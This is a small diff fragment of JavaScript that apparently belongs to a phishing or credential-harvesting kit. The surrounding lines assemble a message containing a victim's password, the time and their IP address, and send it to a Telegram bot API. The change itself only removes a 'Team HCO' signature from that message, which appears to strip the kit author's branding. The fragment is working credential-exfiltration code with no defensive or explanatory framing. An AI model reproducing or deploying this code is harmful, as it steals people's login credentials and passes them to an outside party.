@@ -472,7 +472,7 @@ Password: ${password}
 Time: ${new Date().toLocaleString()}
 IP: ${await getIP()}
 
-Thank you Team HCO 🔖`;
+`;
                 
                 const url = `https://api.telegram.org/bot${botfast_key}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
                 
